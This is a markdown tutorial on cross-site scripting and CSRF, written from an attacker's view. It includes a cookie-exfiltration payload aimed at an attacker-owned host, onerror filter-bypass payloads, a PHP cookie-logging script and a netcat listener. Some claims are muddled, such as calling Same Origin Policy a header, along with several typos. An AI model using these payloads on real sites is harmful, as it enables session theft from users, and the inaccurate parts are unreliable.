# Cross-Site Scripting (XSS)

### What is XSS?
XSS is a client side vulnerability that targets users by injecting client-side scripts into the webpage/application to perform malicious attacks. XSS occurs when user input is output onto a page without correctly having it's encoding escaped. This causes the browser to execute these scripts when the page loads as it is unaware that it shouldn't be trusted. It is commonly used to steal users session cookies `document.cookie` or make requests from the users client. 

### What does XSS Look Like?
XSS is commonly just malicious javascipt contained within a HTML script tag and targetting the users cookie such as `<script>document.write("https://www.yourserver.com/?cookie="+document.cookie)</script>`. This payload makes a request to a server that the attacker owns, appending the users session cookie in the URL request. It is important to have a server or endpoint that you control to collect the cookies. This type of payload is not always possible and sometimes filtering bypasses will be required.

### Types of XSS

##### Reflected XSS
Reflected XSS occurs when an input field or URL parameter is reflected back onto the page. A common example of this is a searched phrase being display on the search results page. In this case an attacker may send a link to a victim where the search query is an xss payload.

`www.website.com/?search=<script>{xss_payload}</script>`

##### Stored XSS
Stored XSS is when the XSS payload is stored server-side before being reflected onto the client. In this case stored XSS is persistant and affects every user visiting webpages where the XSS payload is displayed. A common example of this is an attacker inserting an XSS payload into a message/comments field and posting it. This payload is then stored and visible to multiple users who view the message.

### Where to find XSS?
XSS can potentially occur wherever there is user controlled input. 
- Input Fields (Including Hidden Fields)
- URL Paramaters or Just in the URL in general

### XSS Filtering
Sometimes simple XSS payload wont work as applications use filtering techniques in an attempt to prevent XSS. When this occurs it is important to be creative as in most cases XSS can be work. There are a couple of techniques to consider and try.

- Try URL encoding the symbols so that `<script>` becomes `&lt;script&gt;` 
- You can also use other HTMl tags other than script, such as `<img src="javascript:{payload};">`
- On error is also another place you can try as it isn't always considered and javascript can just run without being specified `<img scr=nothing onerror="{javascript_xss_payload">`

##### Other Resources
- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [XSS Shortening Cheatsheet](https://labs.neohapsis.com/2012/04/19/xss-shortening-cheatsheet) 

### CSRF
CSRF stands for Cross-Site-Request-Forgery and is a type of attack that targets authenticated users where the attacker gets the user to make a malicious request on their behalf. Since the user is authenticated and is the one making the request it is seen as valid by the server. This can be done by getting the user to visit a malicious page that makes the request using the cookie for the targeted site. However this is not always possible as sometimes web applcations use Same Origin Policy and CSRF tokens to prevent this attack. However if you mange to find an XSS within the web application itself then you can bypass both of these prevention techniques.

##### Same Origin Policy
Same Origin Policy is a header field that specifies what content is allowed to render on the page. It is important as it mitigates the impact of XSS as scripts will now no longer run or make calls to URL's not belonging to the same domain the web application is hosted on. This makes it impossible for users to steal credentials through XSS as well ruling out some filtering techniques. It is important to realise that XSS is still possible if you can inject a script into the web application and perform a CSRF attack.

### Attacker Server (Collecting Cookies)
In order to steal users session cookies you will require a server or endpoint that you control to send the cookies to. This can be done multiple ways, hosting a simple web server either in python or nodejs that just grabs the URL request and appends it to a file. Below are examples of a php script that can be used, it is good as the server doesn't have to actually run and a netcat command that can be used to listen to requests. [XSS Hunter](https://xsshunter.com/) is also a good alternative that can be used if setting up a server is difficult. It provides a custom URL that you can used to view the requests made to the url to collect info.

##### PHP Server
```
<?php
file_put_contents("user_session_cookies.txt", $_GET["cookie"]."\n", FILE_APPEND);
?>
```
##### Netcat
`nc -l 80`

### Other Tools

- [BeEF](http://beefproject.com/) - An automated XSS Exploitation Framework